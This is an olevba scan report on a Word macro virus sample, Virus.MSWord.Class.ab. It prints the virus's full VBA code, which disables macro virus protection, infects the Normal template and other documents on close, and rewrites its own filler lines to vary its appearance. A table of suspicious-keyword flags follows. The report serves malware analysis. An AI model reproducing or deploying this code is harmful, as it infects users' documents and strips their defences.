olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ab-1d7f7705430abcf28c7c3f3796f77f8ac7bd9bbc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ab-1d7f7705430abcf28c7c3f3796f77f8ac7bd9bbc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
AA64 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UIL = QBN + KGN
Options.SaveNormalPrompt = 0
OFG = SSM + VUE
VH70 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
PVF = LCV + OAM
Application.EnableCancelKey = 0
CCR = GBG + IGU
Options.ConfirmConversions = 0
VIG = DDO + JJP
Options.VirusProtection = 0
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set DV18 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
EI41 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set DV18 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
DE31 = True
OLS = BEO + JHD
End If
PUL = BQI + KKE
If DE31 <> True And EI41 <> True Then GoTo QQ26
HCM = DUC + JGT
If DE31 = True Then DV18.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AA64 - 1))
QGO = FBA + HRG
If EI41 = True Then DV18.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VH70 - 1))
FKF = HAK + ETM
With DV18.CodeModule
QUH = LBN + JVC
For x = 2 To (DV18.CodeModule.CountOfLines - 1) Step 2
UNH = DKE + VCA
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
HMU = LIS + SOP
Next x
VHK = JPD + JLR
End With
LJL = FNK + OTI
QQ26:
GGD = LEM + HTK
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

